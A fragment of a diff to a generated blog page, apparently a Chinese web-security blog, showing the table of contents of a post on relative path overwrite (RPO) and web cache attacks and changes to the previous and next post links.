class="toc-text">客户端浏览器对于URL的解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用场景-pathinfho"><span class="toc-text">利用场景-pathinfho</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pathinfo例子"><span class="toc-text">pathinfo例子</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用场景-基于-2f"><span class="toc-text">利用场景- 基于%2f</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基于-2f的跨目录解析例子"><span class="toc-text">基于%2f的跨目录解析例子</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防护RPO"><span class="toc-text">防护RPO</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#关于WEB缓存的攻击"><span class="toc-text">关于WEB缓存的攻击</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol>
         
     </div>
     <style>
@@ -431,7 +498,7 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/04/09/WEB-SQL报错注入/" title="上一篇: WEB-SQL报错注入">
+            <a href="/2018/05/06/ZJGSCTF-2018-writeup/" title="上一篇: ZJGSCTF-2018-web writup">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -439,7 +506,7 @@
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/03/26/WEB-网强杯 WEB writeup/" title="下一篇: WEB-网强杯-WEB-writeup">
+            <a href="/2018/04/23/Ubuntu下Apache2、Mysql、php7搭建/" title="下一篇: Ubuntu下Apache2、Mysql、php7搭建">
                 <i class="fa fa-angle-right"></i>
             </a>
         
